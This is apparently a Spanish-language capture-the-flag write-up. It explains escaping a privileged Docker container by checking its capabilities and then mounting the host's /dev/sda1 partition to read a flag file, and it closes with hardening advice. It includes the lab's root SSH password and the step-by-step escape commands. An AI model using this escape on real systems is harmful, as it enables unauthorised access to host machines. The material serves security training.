Writeup: Docker - I am groot 🐳🔓
📋 Índice

    Descripción del Desafío

    Reconocimiento Inicial

    Análisis del Entorno

    Estrategia de Escape

    Escalada de Privilegios

    Obtención de la Flag

    Lecciones Aprendidas

    Referencias

📝 Descripción del Desafío
Enunciado

    "Uno de los sysadmins despliega una máquina docker como root y con privilegios, te dice que no es importante porque mientras esté en el contenedor es seguro :)"

Datos de Acceso

    Servicio: SSH en puerto 2222

    Usuario: root

    Contraseña: arq87TNDCf9NfksD

    Objetivo: Encontrar la flag en el archivo .passwd

Contexto

El desafío plantea una situación típica de mala práctica de seguridad en entornos de contenedores. El administrador confía erróneamente en el aislamiento que proporciona Docker, ignorando los riesgos de ejecutar contenedores con privilegios elevados.
🔍 Reconocimiento Inicial
Conexión al Contenedor
bash

ssh root@localhost -p 2222
# Contraseña: arq87TNDCf9NfksD

¿Por qué SSH? El desafío proporciona acceso SSH para simular un escenario real donde un atacante ha comprometido las credenciales del contenedor.
Verificación de Identidad
bash

root@h3yd0ck3r:~# whoami
root
root@h3yd0ck3r:~# id
uid=0(root) gid=0(root) groups=0(root)

¿Por qué? Confirmamos que estamos dentro del contenedor como usuario root. Este es el primer indicador de que el contenedor no sigue el principio de "mínimo privilegio".
Confirmación del Entorno
bash

root@h3yd0ck3r:~# cat /proc/1/cgroup
0::/
root@h3yd0ck3r:~# ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Jan 16  2022 /.dockerenv

¿Por qué?

    /proc/1/cgroup muestra la jerarquía de control groups. La salida 0::/ confirma que el proceso 1 está en el namespace raíz del contenedor.

    /.dockerenv es un archivo característico que indica que estamos dentro de un contenedor Docker.

Búsqueda Inicial de la Flag
bash

root@h3yd0ck3r:~# find / -name ".passwd" 2>/dev/null
# No se encontró nada en el contenedor

¿Por qué? Realizamos una búsqueda superficial para ver si la flag está accesible directamente dentro del contenedor. Al no encontrarla, confirmamos que probablemente está en el sistema host.
🧐 Análisis del Entorno
Sistema de Archivos Montado
bash

root@h3yd0ck3r:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay          19G  2.0G   16G  11% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda1        19G  2.0G   16G  11% /etc/hosts

bash

root@h3yd0ck3r:~# mount
overlay on / type overlay (rw,relatime,...)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)

Análisis crítico:

    El sistema de archivos raíz usa overlay, típico de Docker.

    ¡ALERTA! /dev/sda1 está montado en /etc/hosts, /etc/hostname y /etc/resolv.conf. Esto significa que el sistema de archivos del host está accesible desde el contenedor.

    El host usa ext4 como sistema de archivos, lo que indica un sistema Linux estándar.

Capacidades del Contenedor
bash

root@h3yd0ck3r:~# capsh --print
Current: =ep
Bounding set =cap_chown,cap_dac_override,...,cap_sys_admin,...
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)

¿Qué significa =ep?

    =: Todas las capacidades están disponibles

    e: Effective - capacidades efectivamente activas

    p: Permitted - capacidades que el proceso puede usar

Capacidades críticas identificadas:

    CAP_SYS_ADMIN: Permite montar sistemas de archivos, realizar operaciones administrativas

    CAP_DAC_OVERRIDE: Permite bypass de permisos de archivos

    CAP_SYS_PTRACE: Permite trazado de procesos y manipulación de memoria

    CAP_NET_ADMIN: Permite configuración de red

Esto confirma que el contenedor se ejecutó con --privileged o con todas las capacidades habilitadas.
Discos y Particiones
bash

root@h3yd0ck3r:~# ls -la /dev/sd*
brw-rw---- 1 root disk 8, 0 Jul 29 11:42 /dev/sda
brw-rw---- 1 root disk 8, 1 Jul 29 11:42 /dev/sda1
brw-rw---- 1 root disk 8, 2 Jul 29 11:42 /dev/sda2
brw-rw---- 1 root disk 8, 5 Jul 29 11:42 /dev/sda5

root@h3yd0ck3r:~# fdisk -l
Disk /dev/sda: 20 GiB
Device     Boot    Start      End  Sectors  Size Id Type
/dev/sda1  *        2048 39942143 39940096   19G 83 Linux
/dev/sda2       39944190 41940991  1996802  975M  5 Extended
/dev/sda5       39944192 41940991  1996800  975M 82 Linux swap

¿Por qué analizar los discos? Identificamos que /dev/sda1 es la partición principal de Linux (19GB) donde probablemente se encuentra el sistema operativo host con la flag.
🚀 Estrategia de Escape
Técnica Utilizada: Montaje del Sistema Host

Fundamento: Un contenedor con CAP_SYS_ADMIN puede montar sistemas de archivos. Al montar /dev/sda1 (la partición raíz del host) dentro del contenedor, obtenemos acceso directo a todo el sistema de archivos del host.
bash

# Crear punto de montaje
mkdir -p /mnt/root

# Montar la partición del host
mount /dev/sda1 /mnt/root

¿Por qué funciona?

    El kernel Linux permite montar dispositivos de bloque si el proceso tiene CAP_SYS_ADMIN

    Docker no restringe este acceso cuando se usa --privileged

    El sistema de archivos del host se convierte en un directorio accesible desde el contenedor

🎯 Obtención de la Flag
Búsqueda Estructurada
bash

# Buscar archivos .passwd en el sistema del host
find /mnt/root -name ".passwd" -type f 2>/dev/null
/mnt/root/.passwd

bash

# Buscar archivos passwd (excluyendo /etc/passwd)
find /mnt/root -name "passwd" -type f 2>/dev/null | grep -v etc
/mnt/root/passwd
/mnt/root/usr/share/lintian/overrides/passwd
/mnt/root/usr/share/bash-completion/completions/passwd
/mnt/root/usr/bin/passwd
...

Exploración del Directorio Raíz del Host
bash

root@h3yd0ck3r:~# ls -la /mnt/root/
total 92
drwxr-xr-x 18 root root  4096 Jul 29 11:43 .
drwxr-xr-x  1 root root  4096 Jul 29 11:51 ..
-rw-r--r--  1 root root    33 Jan  8  2022 .passwd
-r--------  1 root root    33 Jul 29 11:43 passwd
...

Observación crítica:

    .passwd tiene permisos -rw-r--r-- (644) - legible por todos

    passwd tiene permisos -r-------- (400) - solo legible por root

    Esto es inusual: normalmente el archivo oculto sería más restrictivo. Aquí, el archivo visible passwd es más restrictivo, lo que podría indicar un señuelo.

Lectura de la Flag
bash

root@h3yd0ck3r:~# cat /mnt/root/.passwd
*******************************

bash

root@h3yd0ck3r:~# cat /mnt/root/passwd
*******************************

Validación de la Flag Correcta

Proceso de verificación:

    Análisis de permisos: .passwd (644) vs passwd (400)

    Contexto del desafío: El enunciado menciona .passwd

    Validación en plataforma: La flag del archivo .passwd fue aceptada

Flag final:
text

*******************************

📊 Diagrama del Ataque
text

┌─────────────────────────────────────────────────────────────────┐
│                       ATACANTE                                 │
│                         ↓                                      │
│              ┌──────────────────────┐                         │
│              │   ssh root@localhost  │                         │
│              │   -p 2222            │                         │
│              └──────────────────────┘                         │
│                         ↓                                      │
│         ┌─────────────────────────────────┐                    │
│         │  CONTENEDOR DOCKER (root)       │                    │
│         │  • overlay filesystem           │                    │
│         │  • CAP_SYS_ADMIN                │                    │
│         │  • CAP_DAC_OVERRIDE             │                    │
│         │  • CAP_SYS_PTRACE               │                    │
│         └─────────────────────────────────┘                    │
│                         ↓                                      │
│              ┌──────────────────────┐                         │
│              │  mount /dev/sda1     │                         │
│              │  /mnt/root           │                         │
│              └──────────────────────┘                         │
│                         ↓                                      │
│         ┌─────────────────────────────────┐                    │
│         │  SISTEMA HOST                   │                    │
│         │  /mnt/root/.passwd              │                    │
│         │  ****************************** │                    │
│         └─────────────────────────────────┘                    │
│                         ↓                                      │
│              ┌──────────────────────┐                         │
│              │  🏆 FLAG OBTENIDA    │                         │
│              └──────────────────────┘                         │
└─────────────────────────────────────────────────────────────────┘

💡 Lecciones Aprendidas
1. ⚠️ Nunca ejecutar contenedores como root
dockerfile

# MALA PRÁCTICA
docker run --privileged --user root ...

# BUENA PRÁCTICA
docker run --user 1000:1000 --cap-drop=ALL ...

2. 🔒 Principio de Mínimo Privilegio

    Usar --cap-drop=ALL y solo añadir capacidades necesarias

    Evitar --privileged a menos que sea absolutamente necesario

    Usar --security-opt para restringir acciones peligrosas

3. 🛡️ Protección contra Escape de Contenedores

    Usar seccomp: --security-opt seccomp=seccomp.json

    AppArmor/SELinux: Perfiles de seguridad

    No montar el socket de Docker: /var/run/docker.sock

    No montar directorios sensibles del host: /, /etc, /proc, /sys

4. 🔍 Detección de Contenedores Privilegiados

Señales de alerta:

    Usuario root dentro del contenedor

    /.dockerenv presente

    Capacidades =ep

    Montajes del sistema de archivos del host

5. 🏗️ Mejores Prácticas de Seguridad
dockerfile

# Dockerfile seguro
FROM ubuntu:22.04
RUN useradd -m -u 1000 appuser
USER appuser
# Ejecutar con usuario no-root

bash

# Ejecución segura
docker run \
  --user 1000:1000 \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges \
  --read-only \
  --tmpfs /tmp \
  mi_app:latest
